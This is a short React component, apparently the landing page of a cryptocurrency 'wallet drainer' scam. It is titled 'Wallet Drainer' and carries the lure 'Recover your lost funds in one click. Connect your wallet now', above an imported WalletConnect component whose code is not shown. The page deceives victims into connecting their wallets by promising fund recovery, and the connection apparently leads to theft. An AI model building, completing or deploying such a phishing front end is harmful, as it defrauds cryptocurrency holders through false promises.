import React, { useEffect } from 'react';
import './App.css';
import WalletConnect from './components/WalletConnect';

function App() {
  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-900 text-white p-4">
      <div className="max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg text-center">
        <h1 className="text-4xl font-bold mb-6">Wallet Drainer</h1>
        <p className="text-lg mb-8">
          Recover your lost funds in one click. Connect your wallet now.
        </p>
        <WalletConnect />
      </div>
    </div>
  );
}

export default App;